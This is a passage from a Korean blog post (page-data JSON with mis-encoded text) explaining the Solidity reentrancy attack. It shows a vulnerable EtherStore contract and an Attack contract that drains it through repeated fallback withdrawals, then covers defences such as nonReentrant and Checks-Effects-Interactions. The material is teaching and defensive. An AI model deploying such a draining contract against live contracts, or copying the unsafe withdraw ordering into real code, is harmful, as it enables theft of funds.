href=\"#reentrancy-attack%EC%9E%AC%EC%A7%84%EC%9E%85-%EA%B3%B5%EA%B2%A9%EC%9D%B4%EB%9E%80\" aria-label=\"reentrancy attackì¬ì§„ì… ê³µê²©ì´ë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reentrancy Attack(ì¬ì§„ì… ê³µê²©)ì´ë€?</h2>\n<p>Reentrancy Attackì€ contract Aê°€ í•˜ë‚˜ì˜ userë¡œì¨ contract B ì—ê²Œ transactionì„ ë³´ë‚¸ë‹¤. ì´ë•Œ contract Aê°€ ìš”ì²­ì— ëŒ€í•œ ì œì–´ê¶Œì„ ê°€ì§€ê²Œëœë‹¤. ê·¸ë ‡ê²Œ ë˜ë©´ contract Aê°€ ë³´ë‚¸ ì²«ë²ˆì§¸ ìš”ì²­ì´ ëë‚˜ê¸° ì „ì— ë‹¤ë¥¸ í•¨ìˆ˜ë¥¼ ê³„ì†í•´ì„œ í˜¸ì¶œ í•  ìˆ˜ ìˆê²Œëœë‹¤. ì´ëŠ” ì¬ì§„ì…ì„ etherë¥¼ ë¹¼ì˜¬ ìˆ˜ ìˆê²Œ ëœë‹¤.</p>\n<h2 id=\"example-code\" style=\"position:relative;\"><a href=\"#example-code\" aria-label=\"example code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example Code</h2>\n<p>ì˜ˆì‹œë¥¼ í•˜ë‚˜ ë³´ë„ë¡ í•˜ì!\r\nì²«ë²ˆì§¸ contract AëŠ” etherë¥¼ ë³´ê´€í•˜ëŠ” ê³³\r\në‘ë²ˆì§¸ contract BëŠ” Aë¥¼ ê³µê²©í•˜ëŠ” contractì´ë‹¤.</p>\n<p>ê·¸ëŒ€ë¡œ remixë¥¼ ì‚¬ìš©í•´ í…ŒìŠ¤íŠ¸í•´ë³´ë©´ ì´í•´ê°€ ë¹ ë¥¼ ê²ƒì´ë‹¤!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">EtherStore</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token builtin\">uint</span> bal <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>bal <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> bal<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n    \r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">{</span>\r\n    EtherStore <span class=\"token keyword\">public</span> etherStore<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _etherStoreAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        etherStore <span class=\"token operator\">=</span> <span class=\"token function\">EtherStore</span><span class=\"token punctuation\">(</span>_etherStoreAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// Fallback is called when EtherStore sends Ether to this contract.</span>\r\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>etherStore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n            etherStore<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">>=</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        etherStore<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        etherStore<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// Helper function to check the balance of this contract</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li><span style=\"color:grey\">ì¶œì²˜: <a href=\"https://solidity-by-example.org/hacks/re-entrancy/\">https://solidity-by-example.org/hacks/re-entrancy/</a></span></li>\n</ul>\n<p><strong>EtherStore contract</strong> ë¥¼ ë³´ë©´ depositê³¼ withdraw í•¨ìˆ˜ê°€ ì¡´ì¬í•œë‹¤.</p>\n<ul>\n<li>deposit í•¨ìˆ˜ë¥¼ ì›í•˜ëŠ” ë§Œí¼ì˜ etherë¥¼ ë³´ê´€í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” í•¨ìˆ˜ì´ë‹¤.</li>\n<li>withdraw í•¨ìˆ˜ëŠ” ìì‹ ì´ ë³´ê´€í•œ etherë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” í•¨ìˆ˜ì´ë‹¤.</li>\n</ul>\n<p><strong>Attack contract</strong> ì—ëŠ” attackê³¼ fallbackí•¨ìˆ˜ê°€ ì¡´ì¬í•œë‹¤.</p>\n<ul>\n<li>attack í•¨ìˆ˜ëŠ” ether í•˜ë‚˜ë¥¼ deposití•˜ê³  ì´í›„ ë°”ë¡œ withdraw í•œë‹¤</li>\n<li>fallback í•¨ìˆ˜ì—ëŠ” etherê°€ 1ì´ìƒ ë³´ê´€ë˜ì–´ ìˆë‹¤ë©´ withdrawí•¨ìˆ˜ë¥¼ ë‹¤ì‹œ ë¶€ë¥¸ë‹¤.</li>\n</ul>\n<p>í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ëŠ” ìˆœì„œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">- Attack.attack\r\n- EtherStore.deposit\r\n- EtherStore.withdraw\r\n- Attack fallback (receives 1 Ether)\r\n- EtherStore.withdraw\r\n- Attack.fallback (receives 1 Ether)\r\n- EtherStore.withdraw\r\n- Attack fallback (receives 1 Ether)\r\n- ...(ì´í›„ ë°˜ë³µ)</code></pre></div>\n<ol>\n<li>ê³µê²©ìê°€ attack í•¨ìˆ˜ë¥¼ í†µí•´ EtherStoreì— 1 etherë¥¼ deposití•œë‹¤</li>\n<li>ì´í›„ EtherStoreì— 1 etherë¥¼ ì°¾ê² ë‹¤ê³  withdraw í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤.</li>\n<li>withdraw í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë©´ attack í•¨ìˆ˜ì˜ fallback functionì´ í˜¸ì¶œëœë‹¤.(ì´ë”ë¥¼ ê°€ì ¸ì˜¤ê¸° ë•Œë¬¸ì—!)</li>\n<li>ì´í›„ fallback function ì•ˆì— ìˆëŠ” withdrawí•¨ìˆ˜ë¥¼ ì¬í˜¸ì¶œ í•˜ê²Œëœë‹¤.</li>\n<li>ì´í›„ 3-4 ê³¼ì •ì´ ë°˜ë³µë˜ë©° ì¬ì§„ì… ê³µê²©ì´ ì„±ê³µí•œë‹¤.</li>\n</ol>\n<p>ì´ì²˜ëŸ¼ ì¬ì§„ì… ê³µê²©ì„ í†µí•´ ë¶€ë‹¹í•œ ì´ë“ì„ ì·¨í•  ìˆ˜ ìˆê²Œëœë‹¤.</p>\n<h2 id=\"reentrancy-attackì¬ì§„ì…-ê³µê²©-dao\" style=\"position:relative;\"><a href=\"#reentrancy-attack%EC%9E%AC%EC%A7%84%EC%9E%85-%EA%B3%B5%EA%B2%A9-dao\" aria-label=\"reentrancy attackì¬ì§„ì… ê³µê²© dao permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reentrancy Attack(ì¬ì§„ì… ê³µê²©) DAO?</h2>\n<p>Reentrancy Attackì€ DAO</p>\n<h2 id=\"how-to-prevent\" style=\"position:relative;\"><a href=\"#how-to-prevent\" aria-label=\"how to prevent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to prevent?</h2>\n<p>ê·¸ë ‡ë‹¤ë©´ reentrency attackì€ ì–´ë–»ê²Œ ì˜ˆë°© í•  ìˆ˜ ìˆì„ê¹Œ?</p>\n<p>Reentrency attackì€ ì˜ˆë°©í•˜ëŠ” ë°©ë²•ì€ ì´ 2ê°€ì§€ë¡œ ë‚˜ëˆŒ ìˆ˜ ìˆë‹¤.</p>\n<ol>\n<li>\n<p>openzepplineì˜ ReentrancyGuard contractì˜ noReentrant modifier ì‚¬ìš©í•˜ê¸°</p>\n<ul>\n<li>openzeppline LibraryëŠ” secure smart contract ê°œë°œì„ ìœ„í•œ Libraryì´ë‹¤.</li>\n<li>noReentrant modifierì˜ ì½”ë“œëŠ” ì´ëŸ¬í•˜ë‹¤.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">    <span class=\"token keyword\">modifier</span> <span class=\"token function\">nonReentrant</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token comment\">// On the first call to nonReentrant, _notEntered will be true</span>\r\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_status <span class=\"token operator\">!=</span> _ENTERED<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ReentrancyGuard: reentrant call\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">// Any calls to nonReentrant after this point will fail</span>\r\n    _status <span class=\"token operator\">=</span> _ENTERED<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">// By storing the original value once again, a refund is triggered (see</span>\r\n    <span class=\"token comment\">// https://eips.ethereum.org/EIPS/eip-2200)</span>\r\n    _status <span class=\"token operator\">=</span> _NOT_ENTERED<span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>í•¨ìˆ˜ ë’¤ì— noReentrantë¥¼ ë¶™í˜€ì£¼ëŠ” ê²ƒìœ¼ë¡œ ì‰¬ê²Œ ì‚¬ìš© ê°€ëŠ¥í•˜ë‹¤.</p>\n</li>\n<li>\n<p>Check-Effects-Interaction íŒ¨í„´</p>\n</li>\n</ol>\n<ul>\n<li>í•¨ìˆ˜ ë‚´ì—ì„œ interactionì´ ì¼ì–´ë‚˜ê¸° ì „ checkì™€ effectë¥¼ ë‹¤ ì ìš©í•˜ëŠ” íŒ¨í„´ì´ë‹¤. ìœ„ ì˜ˆì œì˜ withdraw í•¨ìˆ˜ ê°™ì€ ê²½ìš° effect ë¶€ë¶„ì´ interaction ë¶€ë¶„ ë‹¤ìŒì— ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.</li>\n<li>Check-Effects-Interaction íŒ¨í„´ì„ ì ìš©í•˜ê²Œ ë˜ë©´ interactioní•˜ê¸° ì „ì— ë¨¼ì € balanceì— ëŒ€í•œ ë°ì´í„°ê°€ ë°”ë€œìœ¼ë¡œ reentrencyí•˜ê²Œ ë˜ì–´ë„ requireë¬¸ì— ê±¸ë¦¬ê²Œ ëœë‹¤.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n      <span class=\"token builtin\">uint</span> bal <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>bal <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n      <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> bal<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// interaction ë¶€ë¶„!!</span>\r\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n      balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// effect!!</span>\r\n  <span class=\"token punctuation\">}</span></code></pre></div>\n<h2 id=\"ë§ˆì¹˜ë©°\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EC%B9%98%EB%A9%B0\" aria-label=\"ë§ˆì¹˜ë©° permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆì¹˜ë©°</h2>\n<p>â€œë¸”ë¡ì²´ì¸ì€ í•´í‚¹ ë‹¹í•˜ì§€ ì•ŠëŠ”ë‹¤!â€ ë¼ëŠ” ê²ƒì€ ë§ëŠ” ë§ì´ì§€ë§Œ ë¸”ë¡ì²´ì¸ ìœ„ì—ì„œ ë§Œë“¤ì–´ì§€ëŠ” smart contractëŠ” ê·¸ë ‡ì§€ ì•Šë‹¤. ì½”ë“œë¥¼ ì¡°ê¸ˆì´ë¼ë„ ì˜ëª» ì§œê²Œë˜ë©´ Reentrency attackê³¼ ë§ì€ ì·¨ì•½ì ë“¤ì´ ìƒê¸¸ ìˆ˜ ìˆë‹¤. ê·¸ëŸ¼ìœ¼ë¡œ ì•ìœ¼ë¡œ ì·¨ì•½ì ë“¤ì— ëŒ€í•´ ê³µë¶€í•´ smart contractë¥¼ ë§Œë“¤ë•Œ ìœ ì˜í•˜ë„ë¡ í•˜ì!!</p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0%EC%A0%84\">ë“¤ì–´ê°€ê¸°ì „</a></p>\n<ul>\n<li><a href=\"#fallback-%ED%95%A8%EC%88%98\">Fallback í•¨ìˆ˜?</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#reentrancy-attack%EC%9E%AC%EC%A7%84%EC%9E%85-%EA%B3%B5%EA%B2%A9%EC%9D%B4%EB%9E%80\">Reentrancy Attack(ì¬ì§„ì… ê³µê²©)ì´ë€?</a></p>\n</li>\n<li>\n<p><a href=\"#example-code\">Example Code</a></p>\n</li>\n<li>\n<p><a href=\"#reentrancy-attack%EC%9E%AC%EC%A7%84%EC%9E%85-%EA%B3%B5%EA%B2%A9-dao\">Reentrancy Attack(ì¬ì§„ì… ê³µê²©) DAO?</a></p>\n</li>\n<li>\n<p><a href=\"#how-to-prevent\">How to prevent?</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EC%B9%98%EB%A9%B0\">ë§ˆì¹˜ë©°</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 15, 2021","title":"Reentrancy Attack (ì¬ì§„ì… ê³µê²©)?","categories":"SmartContractVulnerabilities","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/smart_contract/reentrancy_attack/"}},"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":""}}}}},"pageContext":{"slug":"/evm/","nextSlug":"/startingBlog/","prevSlug":"/smart_contract/reentrancy_attack/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}